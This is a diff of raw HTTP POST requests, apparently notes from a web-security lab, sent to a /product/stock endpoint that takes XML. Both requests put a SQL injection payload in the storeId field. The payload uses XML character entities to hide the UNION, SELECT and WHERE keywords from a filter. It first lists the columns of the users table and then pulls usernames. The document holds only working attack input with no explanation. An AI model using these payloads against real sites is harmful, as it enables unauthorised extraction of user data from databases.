@@ -12,3 +12,19 @@ Te: trailers
 Connection: close
 
 <?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#85;NION &#x53;ELECT column_name FROM information_schema.columns &#87;HERE table_name = &apos;users&apos;</storeId></stockCheck>
+
+
+POST /product/stock HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/xml
+Content-Length: 149
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1 &#85;NION &#x53;ELECT username FROM users</storeId></stockCheck>
